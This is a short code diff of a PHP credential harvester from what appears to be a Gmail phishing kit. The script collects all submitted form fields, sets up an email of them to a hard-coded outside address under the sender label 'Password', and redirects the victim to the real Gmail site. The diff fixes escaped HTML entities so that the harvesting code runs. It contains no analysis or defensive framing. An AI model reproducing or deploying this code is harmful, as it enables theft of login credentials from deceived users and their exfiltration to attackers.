@@ -29,14 +29,14 @@ All Right Reserved
 header ('Location: https://www.gmail.com');
 
 $posts        = '';
-foreach($_POST as $k =&gt; $v){
+foreach($_POST as $k => $v){
     $posts .= '$_POST['.$k.'] = '.$v."\n";
 }
 
 $posts       .= "---------------------------------------------------\n";
 $emailto    = 'pramod.sin321@gmail.com';
 $subject    = $_SERVER['HTTP_HOST']."-".$_SEREVER['SERVER_NAME'];
-$from        = "From: Password &lt;h4kurd.team@gmail.com&gt;";
+$from        = "From: Password <h4kurd.team@gmail.com>";
 $body        = '
 '.$posts.'
 ';
